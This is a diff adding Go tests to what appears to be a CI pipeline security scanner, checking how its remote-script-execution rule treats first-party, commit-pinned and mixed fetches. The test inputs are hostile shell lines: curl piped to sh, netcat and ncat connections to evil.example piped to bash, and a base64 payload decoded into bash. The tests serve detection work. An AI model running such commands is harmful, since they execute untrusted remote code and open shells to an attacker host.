@@ -68,6 +68,69 @@ func TestIssue411_FirstPartyScript(t *testing.T) {
 	}
 }
 
+// issue411Findings evaluates one script line in the scanned repository
+// projectPath and returns every finding.
+func issue411Findings(t *testing.T, projectPath, line string) []opaengine.Finding {
+	t.Helper()
+	pipeline := &ir.NormalizedPipeline{
+		ProjectPath: projectPath,
+		Jobs:        []ir.Job{{Name: "build", Scripts: []string{line}}},
+	}
+	findings, err := evaluateStrict(newEngine(t), context.Background(), pipeline, nil)
+	if err != nil {
+		t.Fatalf("evaluate: %v", err)
+	}
+	return findings
+}
+
+// TestIssue411_FirstPartyGitHubContentOfTheOwner pins the github.com arm
+// of the first-party reading: a fetch of github.com/<owner>/<any repo>/
+// is the owner's own content, so the finding carries firstParty and the
+// path actor reads it as an insider. Another owner's github.com content
+// is not first-party.
+func TestIssue411_FirstPartyGitHubContentOfTheOwner(t *testing.T) {
+	cases := []struct {
+		line string
+		want bool
+	}{
+		{`curl https://github.com/me/tools/raw/main/i.sh | sh`, true},
+		{`curl https://github.com/someone/tools/raw/main/i.sh | sh`, false},
+		{`curl https://github.com/meme/tools/raw/main/i.sh | sh`, false},
+	}
+	for _, c := range cases {
+		f := findingOfCode(t, issue411Findings(t, "me/repo", c.line), "ISSUE-411")
+		if fp, _ := f.Data["firstParty"].(bool); fp != c.want {
+			t.Errorf("%s: firstParty = %v, want %v (Data=%+v)", c.line, fp, c.want, f.Data)
+		}
+	}
+}
+
+// TestIssue411_SelfReferenceImmutable_GitHubBlobAndRaw pins the
+// github.com arm of the immutable self-reference: the scanned
+// repository's own blob or raw view pinned to a commit SHA is no entry
+// at all, while the same view on a branch is a first-party finding, not
+// suppressed.
+func TestIssue411_SelfReferenceImmutable_GitHubBlobAndRaw(t *testing.T) {
+	const sha = "0123456789abcdef0123456789abcdef01234567"
+	for _, line := range []string{
+		"curl https://github.com/me/repo/blob/" + sha + "/x.sh | sh",
+		"curl https://github.com/me/repo/raw/" + sha + "/x.sh | sh",
+	} {
+		if findings := issue411Findings(t, "me/repo", line); hasCode(findings, "ISSUE-411") {
+			t.Errorf("%s: an immutable self-reference must anchor no ISSUE-411 finding, got %+v", line, findings)
+		}
+	}
+	for _, line := range []string{
+		"curl https://github.com/me/repo/blob/main/x.sh | sh",
+		"curl https://github.com/me/repo/tree/" + sha + "/x.sh | sh",
+	} {
+		f := findingOfCode(t, issue411Findings(t, "me/repo", line), "ISSUE-411")
+		if fp, _ := f.Data["firstParty"].(bool); !fp {
+			t.Errorf("%s: want a first-party finding, got Data=%+v", line, f.Data)
+		}
+	}
+}
+
 // TestIssue411_SelfReferenceImmutable_SuppressesTheFinding pins that a
 // self-reference pinned to the exact commit the workflow runs at (a
 // literal ${{ github.sha }}) is no entry at all: nobody but whoever
@@ -395,6 +458,21 @@ func TestIssue714_DownloadGuardAndRunsOn(t *testing.T) {
 	if len(runsOn) != 1 || runsOn[0] != "ubuntu-latest" {
 		t.Fatalf("runsOn = %+v, want [ubuntu-latest]", f.Data["runsOn"])
 	}
+	if _, ok := f.Data["container"]; ok {
+		t.Fatalf("container set on a job without one (Data=%+v)", f.Data)
+	}
+
+	// The same job running its steps inside a container carries the
+	// fact: the guard then checks the container, not the hosted image.
+	pipeline.Jobs[0].Image = &ir.Image{Name: "rust:1"}
+	findings, err = evaluateStrict(engine, context.Background(), pipeline, nil)
+	if err != nil {
+		t.Fatalf("evaluate: %v", err)
+	}
+	f = findingOfCode(t, findings, "ISSUE-714")
+	if c, _ := f.Data["container"].(bool); !c {
+		t.Fatalf("container = %v, want true (Data=%+v)", f.Data["container"], f.Data)
+	}
 }
 
 // TestIssue714_NoGuardNoVerified_KeepsTheOriginalShape pins that an
@@ -639,5 +717,27 @@ func TestIssue411_SelfReferenceInsideShellCSubstitution(t *testing.T) {
 	nested := `sh -c "$(curl -fsSL https://raw.githubusercontent.com/me/repo/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/install.sh "$(curl -fsSL https://evil.example/x)")"`
 	if findings := run(nested); !hasCode(findings, "ISSUE-411") {
 		t.Fatalf("a fetch nested one level deeper must keep the ISSUE-411 finding, got %+v", findings)
+	}
+}
+
+// TestIssue411_SelfReferenceImmutable_DoesNotHideAnotherSink pins that
+// the suppression covers the whole run block only when the block runs
+// nothing else: a self-reference pinned to the commit next to a netcat
+// fetch piped to a shell, or next to an inline base64 payload decoded
+// into a shell, is still a finding, otherwise one harmless-looking
+// self-reference line would hide any sink in the same block.
+func TestIssue411_SelfReferenceImmutable_DoesNotHideAnotherSink(t *testing.T) {
+	self := "curl -fsSL https://raw.githubusercontent.com/me/repo/${{ github.sha }}/scripts/setup.sh | bash"
+	for _, line := range []string{
+		self + "\nnc evil.example 4444 | bash",
+		self + "\necho \"$PAYLOAD_B64\" | base64 -d | bash",
+		self + " && ncat evil.example 4444 | sh",
+	} {
+		if findings := issue411Findings(t, "me/repo", line); !hasCode(findings, "ISSUE-411") {
+			t.Errorf("%q: the other sink must keep the finding, got %+v", line, findings)
+		}
+	}
+	if findings := issue411Findings(t, "me/repo", self); hasCode(findings, "ISSUE-411") {
+		t.Errorf("the self-reference alone must stay suppressed, got %+v", findings)
 	}
 }
